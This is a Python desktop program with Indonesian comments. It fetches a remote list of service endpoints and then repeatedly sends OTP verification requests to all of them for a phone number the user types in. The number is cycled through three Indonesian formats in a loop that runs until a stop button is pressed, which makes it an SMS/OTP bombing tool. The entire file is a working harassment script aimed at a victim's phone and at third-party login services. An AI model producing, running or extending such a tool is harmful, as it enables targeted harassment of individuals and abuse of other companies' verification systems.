import tkinter as tk
import requests
import json
import time
import threading

# Fungsi untuk mengambil data dari URL
def fetch_data():
    url = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/refs/heads/main/otp_config.json"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print("Failed to fetch data")
        return []

# Fungsi untuk mengubah format nomor telepon
def format_number(original_number, format_type):
    if format_type == 'initial':
        return '0' + original_number  # Format awal
    elif format_type == 'international':
        return '62' + original_number  # Format internasional
    elif format_type == 'international_plus':
        return '+62' + original_number  # Format internasional dengan +
    return original_number

# Fungsi untuk mengirim permintaan
def send_requests():
    global is_running
    target_number = entry_number.get().strip()
    
    # Format nomor awal
    formatted_numbers = [
        format_number(target_number, 'initial'),
        format_number(target_number, 'international'),
        format_number(target_number, 'international_plus')
    ]

    while is_running:
        for number in formatted_numbers:
            for service in services:
                service_data = {
                    "url": service["url"],
                    "data": json.loads(service["data"].replace("target_number", number)),
                    "headers": service["headers"]
                }
                try:
                    response = requests.post(service_data["url"], headers=service_data["headers"], json=service_data["data"])
                    if response.status_code == 200:
                        print(f"OTP berhasil dikirim ke {service['name']} untuk nomor {number}!")
                    else:
                        print(f"Gagal mengirim OTP ke {service['name']} untuk nomor {number}: {response.status_code} - {response.text}")
                except Exception as e:
                    print(f"Error saat mengirim ke {service['name']} untuk nomor {number}: {str(e)}")
            
            time.sleep(1)  # Delay antara pengiriman untuk menghindari spam

        # Kembali ke format awal
        entry_number.delete(0, tk.END)
        entry_number.insert(0, target_number)

# Fungsi untuk memulai pengiriman
def start_sending():
    global is_running
    is_running = True
    threading.Thread(target=send_requests).start()

# Fungsi untuk menghentikan pengiriman
def stop_sending():
    global is_running
    is_running = False

# Mendapatkan data dari URL
services = fetch_data()
is_running = False

# Membuat jendela utama
root = tk.Tk()
root.title("Pengirim OTP ke Semua Layanan")

# Membuat label dan entry untuk nomor telepon
label_number = tk.Label(root, text="Masukkan Nomor Telepon:")
label_number.pack(pady=10)

entry_number = tk.Entry(root)
entry_number.pack(pady=10)

# Tombol untuk memulai pengiriman
start_button = tk.Button(root, text="Mulai Kirim OTP", command=start_sending)
start_button.pack(pady=20)

# Tombol untuk menghentikan pengiriman
stop_button = tk.Button(root, text="Stop Pengiriman", command=stop_sending)
stop_button.pack(pady=20)

# Menjalankan aplikasi
root.mainloop()